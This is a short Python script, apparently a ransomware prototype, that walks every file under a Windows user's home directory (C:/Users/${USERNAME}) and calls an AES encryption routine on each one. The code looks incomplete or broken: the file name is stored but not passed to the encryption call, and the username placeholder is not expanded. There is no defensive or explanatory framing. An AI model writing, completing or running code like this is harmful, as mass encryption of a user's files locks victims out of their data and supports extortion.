import pyAesCrypt 
from encrypAES import test, aesEncrypt, aesDecrypt
import os

if __name__ == "__main__":
    rootdir = 'C:/Users/${USERNAME}'

    for subdir, dirs, files in os.walk(rootdir):
        for file in files:
            target = file
            aesEncrypt()

  

    
            